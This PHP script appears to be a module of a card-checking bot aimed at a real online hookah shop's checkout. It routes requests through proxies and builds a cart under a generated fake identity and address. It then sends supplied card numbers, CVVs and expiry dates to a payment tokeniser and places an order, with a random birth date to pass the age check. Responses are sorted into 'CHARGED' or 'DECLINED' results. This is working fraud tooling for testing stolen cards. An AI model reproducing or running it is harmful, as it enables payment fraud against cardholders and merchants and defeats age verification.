<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();


$data = '{"query":"\n mutation {\n createEmptyCart\n }\n"}';

$headers = [
	'content-type: application/json'
];

$r1 = $this->curlx->Post('https://www.hookah-shisha.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$cart = $this->getstr($r1->body, 'createEmptyCart":"', '"');

if (empty($cart)) {
	$empty = "First Request Token is Empty";

	goto start;
}

$data = '{"query":"\n mutation addToCart($cartId: String!, $cartItems: [CartItemInput!]!, $isSignedIn: Boolean = false) {\n addProductsToCart(cartId: $cartId, cartItems: $cartItems){\n cart {\n \n id\n email\n is_virtual\n checkoutUrl\n free_gifts_skus\n last_payment_method\n applied_store_credit @include(if: $isSignedIn) {\n enabled\n current_balance {\n __typename\n currency\n value\n }\n applied_balance {\n __typename\n currency\n value\n }\n }\n items {\n id\n uid\n __typename\n product {\n id\n name\n sku\n stock_status\n thumbnail {\n label\n url\n }\n\n categories {\n name\n url_path\n breadcrumbs {\n category_id\n category_name\n }\n }\n price_range {\n __typename\n minimum_price {\n regular_price {\n value\n currency\n }\n final_price {\n value\n currency\n }\n discount {\n amount_off\n }\n }\n }\n special_price\n url_key\n shisha_title\n charcoal_title\n __typename\n ... on ConfigurableProduct {\n variants {\n attributes {\n code\n label\n uid\n value_index\n }\n product {\n stock_status\n sku\n thumbnail {\n url\n }\n }\n }\n }\n }\n ... on BundleCartItem {\n bundle_options {\n label\n uid\n label\n type\n values {\n quantity\n price\n label\n uid\n }\n }\n }\n ... on SimpleCartItem {\n super_pack_flavour\n alfa_bundle_flavour\n alfa_bundle_charcoal\n }\n ... on ConfigurableCartItem {\n alfa_bundle_flavour\n alfa_bundle_charcoal\n configurable_options {\n configurable_product_option_uid\n configurable_product_option_value_uid\n option_label\n value_label\n }\n }\n ... on GiftCardCartItem {\n __typename\n amount {\n value\n currency\n }\n message\n recipient_email\n recipient_name\n sender_email\n sender_name\n }\n quantity\n prices {\n __typename\n price {\n value\n }\n row_total_including_tax {\n value\n currency\n }\n row_total {\n value\n currency\n }\n total_item_discount {\n value\n currency\n }\n }\n }\n\n prices {\n __typename\n grand_total {\n value\n currency\n }\n subtotal_excluding_tax {\n value\n currency\n }\n subtotal_with_discount_excluding_tax {\n value\n currency\n }\n discounts {\n amount {\n value\n currency\n }\n }\n }\n\n applied_coupons {\n code\n }\n applied_gift_cards {\n code\n current_balance {\n currency\n value\n }\n applied_balance {\n currency\n value\n }\n }\n\n }\n user_errors {\n code\n message\n }\n }\n }\n","variables":{"cartId":"'.$cart.'","cartItems":[{"sku":"BTO-Mouthtip-DualSided","selected_options":["Y29uZmlndXJhYmxlLzU4NC8yNDg4NQ=="],"quantity":1,"alfa_bundle":"\"\""}],"isSignedIn":false}}';

$headers = [
	'content-type: application/json'
];

$r2 = $this->curlx->Post('https://www.hookah-shisha.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$r3 = $this->curlx->Get('https://www.hookah-shisha.com/checkout', null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$data = '{"query":"\n mutation setGuestEmailOnCart($input: SetGuestEmailOnCartInput!) {\n setGuestEmailOnCart(input: $input) {\n cart {\n email\n __typename\n }\n __typename\n }\n }\n","variables":{"input":{"cart_id":"'.$cart.'","email":"'.$fake->email.'"}}}';

$headers = [
	'content-type: application/json'
];

$r4 = $this->curlx->Post('https://www.hookah-shisha.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$data = '{"query":"\n mutation setShippingAddressesOnCart($input: SetShippingAddressesOnCartInput!, $isSignedIn: Boolean = false) {\n setShippingAddressesOnCart(input: $input){\n cart {\n \n id\n email\n is_virtual\n checkoutUrl\n free_gifts_skus\n last_payment_method\n applied_store_credit @include(if: $isSignedIn) {\n enabled\n current_balance {\n __typename\n currency\n value\n }\n applied_balance {\n __typename\n currency\n value\n }\n }\n items {\n id\n uid\n is_out_stock\n oos_message\n __typename\n product {\n id\n name\n sku\n stock_status\n thumbnail {\n label\n url\n }\n\n categories {\n name\n url_path\n breadcrumbs {\n category_id\n category_name\n }\n }\n price_range {\n __typename\n minimum_price {\n regular_price {\n value\n currency\n }\n final_price {\n value\n currency\n }\n discount {\n amount_off\n }\n }\n }\n special_price\n url_key\n shisha_title\n charcoal_title\n __typename\n ... on ConfigurableProduct {\n variants {\n attributes {\n code\n label\n uid\n value_index\n }\n product {\n stock_status\n sku\n thumbnail {\n url\n }\n }\n }\n }\n }\n ... on BundleCartItem {\n bundle_options {\n label\n uid\n label\n type\n values {\n quantity\n price\n label\n uid\n }\n }\n }\n ... on SimpleCartItem {\n super_pack_flavour\n alfa_bundle_flavour\n alfa_bundle_charcoal\n }\n ... on ConfigurableCartItem {\n alfa_bundle_flavour\n alfa_bundle_charcoal\n configurable_options {\n configurable_product_option_uid\n configurable_product_option_value_uid\n option_label\n value_label\n }\n }\n ... on GiftCardCartItem {\n __typename\n amount {\n value\n currency\n }\n message\n recipient_email\n recipient_name\n sender_email\n sender_name\n }\n quantity\n prices {\n __typename\n price {\n value\n }\n row_total_including_tax {\n value\n currency\n }\n row_total {\n value\n currency\n }\n total_item_discount {\n value\n currency\n }\n }\n }\n\n prices {\n __typename\n grand_total {\n value\n currency\n }\n applied_taxes {\n label\n amount {\n value\n currency\n }\n }\n subtotal_including_tax {\n value\n currency\n }\n subtotal_excluding_tax {\n value\n currency\n }\n subtotal_with_discount_excluding_tax {\n value\n currency\n }\n discounts {\n amount {\n value\n currency\n }\n }\n }\n shipping_addresses {\n firstname\n lastname\n company\n street\n city\n region {\n code\n label\n region_id\n }\n postcode\n telephone\n country {\n code\n label\n }\n county\n available_shipping_methods {\n amount {\n currency\n value\n }\n available\n carrier_code\n carrier_title\n error_message\n method_code\n method_title\n price_excl_tax {\n value\n currency\n }\n price_incl_tax {\n value\n currency\n }\n }\n selected_shipping_method {\n carrier_code\n method_code\n carrier_title\n method_title\n amount {\n value\n currency\n }\n }\n }\n billing_address {\n firstname\n lastname\n company\n street\n city\n region {\n code\n label\n region_id\n }\n postcode\n telephone\n country {\n code\n label\n }\n county\n }\n selected_payment_method {\n code\n title\n }\n available_payment_methods {\n code\n title\n }\n applied_coupons {\n code\n }\n applied_gift_cards {\n code\n current_balance {\n currency\n value\n }\n applied_balance {\n currency\n value\n }\n }\n \n }\n }\n }\n","variables":{"input":{"cart_id":"'.$cart.'","shipping_addresses":[{"address":{"firstname":"'.$fake->first.'","lastname":"'.$fake->last.'","city":"Brewster","company":null,"country_code":"US","postcode":"10509-6402","region":"127","street":["12 Main St",""],"telephone":"+12564567654","save_in_address_book":false,"county":"Putnam"}}]},"isSignedIn":false}}';

$headers = [
	'content-type: application/json'
];

$r5 = $this->curlx->Post('https://www.hookah-shisha.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$data = '{"query":"\n mutation setBillingAddressOnCart($input: SetBillingAddressOnCartInput!, $isSignedIn: Boolean = false) {\n setBillingAddressOnCart(input: $input){\n cart {\n \n id\n email\n is_virtual\n checkoutUrl\n free_gifts_skus\n last_payment_method\n applied_store_credit @include(if: $isSignedIn) {\n enabled\n current_balance {\n __typename\n currency\n value\n }\n applied_balance {\n __typename\n currency\n value\n }\n }\n items {\n id\n uid\n is_out_stock\n oos_message\n __typename\n product {\n id\n name\n sku\n stock_status\n thumbnail {\n label\n url\n }\n\n categories {\n name\n url_path\n breadcrumbs {\n category_id\n category_name\n }\n }\n price_range {\n __typename\n minimum_price {\n regular_price {\n value\n currency\n }\n final_price {\n value\n currency\n }\n discount {\n amount_off\n }\n }\n }\n special_price\n url_key\n shisha_title\n charcoal_title\n __typename\n ... on ConfigurableProduct {\n variants {\n attributes {\n code\n label\n uid\n value_index\n }\n product {\n stock_status\n sku\n thumbnail {\n url\n }\n }\n }\n }\n }\n ... on BundleCartItem {\n bundle_options {\n label\n uid\n label\n type\n values {\n quantity\n price\n label\n uid\n }\n }\n }\n ... on SimpleCartItem {\n super_pack_flavour\n alfa_bundle_flavour\n alfa_bundle_charcoal\n }\n ... on ConfigurableCartItem {\n alfa_bundle_flavour\n alfa_bundle_charcoal\n configurable_options {\n configurable_product_option_uid\n configurable_product_option_value_uid\n option_label\n value_label\n }\n }\n ... on GiftCardCartItem {\n __typename\n amount {\n value\n currency\n }\n message\n recipient_email\n recipient_name\n sender_email\n sender_name\n }\n quantity\n prices {\n __typename\n price {\n value\n }\n row_total_including_tax {\n value\n currency\n }\n row_total {\n value\n currency\n }\n total_item_discount {\n value\n currency\n }\n }\n }\n\n prices {\n __typename\n grand_total {\n value\n currency\n }\n applied_taxes {\n label\n amount {\n value\n currency\n }\n }\n subtotal_including_tax {\n value\n currency\n }\n subtotal_excluding_tax {\n value\n currency\n }\n subtotal_with_discount_excluding_tax {\n value\n currency\n }\n discounts {\n amount {\n value\n currency\n }\n }\n }\n shipping_addresses {\n firstname\n lastname\n company\n street\n city\n region {\n code\n label\n region_id\n }\n postcode\n telephone\n country {\n code\n label\n }\n county\n available_shipping_methods {\n amount {\n currency\n value\n }\n available\n carrier_code\n carrier_title\n error_message\n method_code\n method_title\n price_excl_tax {\n value\n currency\n }\n price_incl_tax {\n value\n currency\n }\n }\n selected_shipping_method {\n carrier_code\n method_code\n carrier_title\n method_title\n amount {\n value\n currency\n }\n }\n }\n billing_address {\n firstname\n lastname\n company\n street\n city\n region {\n code\n label\n region_id\n }\n postcode\n telephone\n country {\n code\n label\n }\n county\n }\n selected_payment_method {\n code\n title\n }\n available_payment_methods {\n code\n title\n }\n applied_coupons {\n code\n }\n applied_gift_cards {\n code\n current_balance {\n currency\n value\n }\n applied_balance {\n currency\n value\n }\n }\n \n }\n }\n }\n","variables":{"input":{"cart_id":"'.$cart.'","billing_address":{"address":{"city":"Brewster","company":null,"country_code":"US","firstname":"'.$fake->first.'","lastname":"'.$fake->last.'","postcode":"10509-6402","street":["12 Main St"],"telephone":"+12564567654","region_id":127,"region":"NY","county":"Putnam"}}},"isSignedIn":false}}';

$headers = [
	'content-type: application/json'
];

$r6 = $this->curlx->Post('https://www.hookah-shisha.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r6->success) goto start;

$data = '{"query":"\n mutation setShippingMethodsOnCart($input: SetShippingMethodsOnCartInput!, $isSignedIn: Boolean = false) {\n setShippingMethodsOnCart(input: $input){\n cart {\n \n id\n email\n is_virtual\n checkoutUrl\n free_gifts_skus\n last_payment_method\n applied_store_credit @include(if: $isSignedIn) {\n enabled\n current_balance {\n __typename\n currency\n value\n }\n applied_balance {\n __typename\n currency\n value\n }\n }\n items {\n id\n uid\n is_out_stock\n oos_message\n __typename\n product {\n id\n name\n sku\n stock_status\n thumbnail {\n label\n url\n }\n\n categories {\n name\n url_path\n breadcrumbs {\n category_id\n category_name\n }\n }\n price_range {\n __typename\n minimum_price {\n regular_price {\n value\n currency\n }\n final_price {\n value\n currency\n }\n discount {\n amount_off\n }\n }\n }\n special_price\n url_key\n shisha_title\n charcoal_title\n __typename\n ... on ConfigurableProduct {\n variants {\n attributes {\n code\n label\n uid\n value_index\n }\n product {\n stock_status\n sku\n thumbnail {\n url\n }\n }\n }\n }\n }\n ... on BundleCartItem {\n bundle_options {\n label\n uid\n label\n type\n values {\n quantity\n price\n label\n uid\n }\n }\n }\n ... on SimpleCartItem {\n super_pack_flavour\n alfa_bundle_flavour\n alfa_bundle_charcoal\n }\n ... on ConfigurableCartItem {\n alfa_bundle_flavour\n alfa_bundle_charcoal\n configurable_options {\n configurable_product_option_uid\n configurable_product_option_value_uid\n option_label\n value_label\n }\n }\n ... on GiftCardCartItem {\n __typename\n amount {\n value\n currency\n }\n message\n recipient_email\n recipient_name\n sender_email\n sender_name\n }\n quantity\n prices {\n __typename\n price {\n value\n }\n row_total_including_tax {\n value\n currency\n }\n row_total {\n value\n currency\n }\n total_item_discount {\n value\n currency\n }\n }\n }\n\n prices {\n __typename\n grand_total {\n value\n currency\n }\n applied_taxes {\n label\n amount {\n value\n currency\n }\n }\n subtotal_including_tax {\n value\n currency\n }\n subtotal_excluding_tax {\n value\n currency\n }\n subtotal_with_discount_excluding_tax {\n value\n currency\n }\n discounts {\n amount {\n value\n currency\n }\n }\n }\n shipping_addresses {\n firstname\n lastname\n company\n street\n city\n region {\n code\n label\n region_id\n }\n postcode\n telephone\n country {\n code\n label\n }\n county\n available_shipping_methods {\n amount {\n currency\n value\n }\n available\n carrier_code\n carrier_title\n error_message\n method_code\n method_title\n price_excl_tax {\n value\n currency\n }\n price_incl_tax {\n value\n currency\n }\n }\n selected_shipping_method {\n carrier_code\n method_code\n carrier_title\n method_title\n amount {\n value\n currency\n }\n }\n }\n billing_address {\n firstname\n lastname\n company\n street\n city\n region {\n code\n label\n region_id\n }\n postcode\n telephone\n country {\n code\n label\n }\n county\n }\n selected_payment_method {\n code\n title\n }\n available_payment_methods {\n code\n title\n }\n applied_coupons {\n code\n }\n applied_gift_cards {\n code\n current_balance {\n currency\n value\n }\n applied_balance {\n currency\n value\n }\n }\n \n }\n }\n }\n","variables":{"input":{"cart_id":"'.$cart.'","shipping_methods":[{"carrier_code":"shqusps1","method_code":"PriorityMail"}]},"isSignedIn":false}}';

$headers = [
	'content-type: application/json'
];

$r7 = $this->curlx->Post('https://www.hookah-shisha.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r7->success) goto start;

$data = '{"environment_key":"FcnSDHHrqbvNoarHer6WuN9xULf","payment_method":{"credit_card":{"number":"'.$cc.'","verification_value":"'.$cvv.'","full_name":"'.$fake->first.' '.$fake->last.'","month":"'.$mm.'","year":"'.$yyyy.'"}}}';

$headers = [
	'content-type: application/json'
];

$r8 = $this->curlx->Post('https://core.spreedly.com/v1/payment_methods/restricted.json?from=iframe&v=1.99', $data, $headers, $cookie, $server['proxy']);

if (!$r8->success) goto start;

$token = $this->getstr($r8->body, 'payment_method":{"token":"', '"');

if (empty($token)) {
	$empty = "Eight Request Token is Empty";

	goto start;
}

$data = '{"query":"\n mutation setPaymentMethodOnCart($input: SetPaymentMethodOnCartInput!, $isSignedIn: Boolean = false) {\n setPaymentMethodOnCart(input: $input){\n cart {\n \n id\n email\n is_virtual\n checkoutUrl\n free_gifts_skus\n last_payment_method\n applied_store_credit @include(if: $isSignedIn) {\n enabled\n current_balance {\n __typename\n currency\n value\n }\n applied_balance {\n __typename\n currency\n value\n }\n }\n items {\n id\n uid\n is_out_stock\n oos_message\n __typename\n product {\n id\n name\n sku\n stock_status\n thumbnail {\n label\n url\n }\n\n categories {\n name\n url_path\n breadcrumbs {\n category_id\n category_name\n }\n }\n price_range {\n __typename\n minimum_price {\n regular_price {\n value\n currency\n }\n final_price {\n value\n currency\n }\n discount {\n amount_off\n }\n }\n }\n special_price\n url_key\n shisha_title\n charcoal_title\n __typename\n ... on ConfigurableProduct {\n variants {\n attributes {\n code\n label\n uid\n value_index\n }\n product {\n stock_status\n sku\n thumbnail {\n url\n }\n }\n }\n }\n }\n ... on BundleCartItem {\n bundle_options {\n label\n uid\n label\n type\n values {\n quantity\n price\n label\n uid\n }\n }\n }\n ... on SimpleCartItem {\n super_pack_flavour\n alfa_bundle_flavour\n alfa_bundle_charcoal\n }\n ... on ConfigurableCartItem {\n alfa_bundle_flavour\n alfa_bundle_charcoal\n configurable_options {\n configurable_product_option_uid\n configurable_product_option_value_uid\n option_label\n value_label\n }\n }\n ... on GiftCardCartItem {\n __typename\n amount {\n value\n currency\n }\n message\n recipient_email\n recipient_name\n sender_email\n sender_name\n }\n quantity\n prices {\n __typename\n price {\n value\n }\n row_total_including_tax {\n value\n currency\n }\n row_total {\n value\n currency\n }\n total_item_discount {\n value\n currency\n }\n }\n }\n\n prices {\n __typename\n grand_total {\n value\n currency\n }\n applied_taxes {\n label\n amount {\n value\n currency\n }\n }\n subtotal_including_tax {\n value\n currency\n }\n subtotal_excluding_tax {\n value\n currency\n }\n subtotal_with_discount_excluding_tax {\n value\n currency\n }\n discounts {\n amount {\n value\n currency\n }\n }\n }\n shipping_addresses {\n firstname\n lastname\n company\n street\n city\n region {\n code\n label\n region_id\n }\n postcode\n telephone\n country {\n code\n label\n }\n county\n available_shipping_methods {\n amount {\n currency\n value\n }\n available\n carrier_code\n carrier_title\n error_message\n method_code\n method_title\n price_excl_tax {\n value\n currency\n }\n price_incl_tax {\n value\n currency\n }\n }\n selected_shipping_method {\n carrier_code\n method_code\n carrier_title\n method_title\n amount {\n value\n currency\n }\n }\n }\n billing_address {\n firstname\n lastname\n company\n street\n city\n region {\n code\n label\n region_id\n }\n postcode\n telephone\n country {\n code\n label\n }\n county\n }\n selected_payment_method {\n code\n title\n }\n available_payment_methods {\n code\n title\n }\n applied_coupons {\n code\n }\n applied_gift_cards {\n code\n current_balance {\n currency\n value\n }\n applied_balance {\n currency\n value\n }\n }\n \n }\n }\n }\n","variables":{"input":{"cart_id":"'.$cart.'","payment_method":{"code":"spreedly","additional_data":{"payment_method_token":"'.$token.'","is_active_payment_token_enabler":false}}},"isSignedIn":false}}';

$headers = [
	'content-type: application/json'
];

$r9 = $this->curlx->Post('https://www.hookah-shisha.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r9->success) goto start;

$data = '{"query":"\n mutation placeOrder($input: PlaceOrderInput!) {\n placeOrder(input: $input) {\n order {\n order_number\n vr_widget_url\n vr_brand\n }\n }\n }\n","variables":{"input":{"cart_id":"'.$cart.'","alfa_consent":true,"veratad_dob":"'.rand(1990, 2000).'-0'.rand(1, 9).'-0'.rand(1, 9).'","is_ageverified":false}}}';

$headers = [
	'content-type: application/json'
];

$r10 = $this->curlx->Post('https://www.hookah-shisha.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r10->success || empty($r10->body)) goto start;

$json_r10 = json_decode($r10->body);

if (!isset($json_r10->errors)) {
	$order = $this->getstr($r10->body, 'order_number":"', '"');

	if (empty($order)) file_put_contents('spa_r10_no_order.txt', $r10->body . PHP_EOL, FILE_APPEND);

	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CHARGED - Order Placed!".(empty($order) ? "" : " ($order)")];

	goto end;
}

$msgs = [];

foreach ($json_r10->errors as $err) {
	$msgs[] = $err->message;
}

$err = trim(str_replace('Unable to place order:', '', implode(', ', $msgs)));

$status = $this->response->Shopify($r10->body, $err);

end: